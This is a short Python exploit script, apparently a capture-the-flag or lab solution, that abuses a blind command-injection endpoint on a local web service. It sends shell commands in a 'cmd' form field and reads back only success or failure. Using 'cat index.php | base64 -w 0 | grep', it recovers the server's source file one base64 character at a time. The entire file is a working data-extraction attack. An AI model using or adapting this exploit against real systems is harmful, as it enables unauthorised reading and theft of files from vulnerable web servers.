import requests
import base64
import urllib.parse


def test_b64(b64: str):
    cmd = f'cat index.php | base64 -w 0 | grep ^{urllib.parse.quote(b64)}'
    result = run_command(cmd)
    if result:
        print(b64)
    return result


def run_command(cmd: str):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    r = requests.post('http://localhost:8000', data=f'cmd={cmd}', headers=headers)
    if 'Success' in r.text:
        return True
    elif 'nothing' in r.text:
        return False
    else:
        raise Exception(f'{r.text}\n\nCommand {cmd} returned bad result')


alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/+0123456789'
def brute(curr_str = ''):
    while True:
        found = False
        for c in alphabet:
            if test_b64(curr_str + c):
                curr_str += c
                found = True
                break
        if not found:
            break
    return curr_str


def main():
    assert run_command('ls')
    assert not run_command('ls yeet')
    print('tests passed')
    print(brute())


if __name__ == '__main__':
    main()
